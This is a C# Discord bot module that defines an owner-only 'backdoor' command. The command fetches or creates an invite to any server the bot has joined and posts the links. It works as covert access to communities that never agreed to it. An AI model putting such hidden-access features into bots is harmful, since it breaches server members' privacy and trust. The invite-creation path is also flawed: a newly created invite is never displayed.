using System;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace FifthBot.Core.Moderation
{
    
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [RequireOwner(Group = "Permission")]
        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task BackdoorTask(ulong GuildId) // can enter a default, but if not, command will not execute
        {
            if (!(Context.User.Id == 270053931000791040))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator!");
                return;

            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id=" + GuildId);
                return;

            }
            /* Here is just a snippet from a command i will eventually write that will
             * run through the intro channels and purge the intros of every user who's left
             * the server
             * 
            
            var GuildUsers = Context.Guild.Users;

            var MessagesFromChannel = await Context.Guild.TextChannels.Where(x => string.Equals(x.Name, "general")).FirstOrDefault().GetMessagesAsync().Flatten();
            foreach (SocketMessage CurrentMsg in MessagesFromChannel)
            {
                bool userFound = false;
                foreach (SocketUser CurrentUser in GuildUsers)
                {
                    if ( CurrentMsg.Author.Id == CurrentUser.Id )
                    {
                        userFound = true;
                    }
                }


            }
            */

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();

            var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count() < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync($":x: Creating an invite for guild{Guild.Name} went wrong with error ```{ex.Message}```");
                }
            }
            EmbedBuilder Embed = new EmbedBuilder();
            Embed.WithAuthor($"Invite for {Guild.Name}:", Guild.IconUrl);
            Embed.WithColor(40, 200, 150);
            foreach (var Current in Invites)
            {
                Embed.AddField("Invite:", $"[Invite]({Current.Url})");
            }

            await Context.Channel.SendMessageAsync("", false, Embed.Build());

        }

    }
    
}
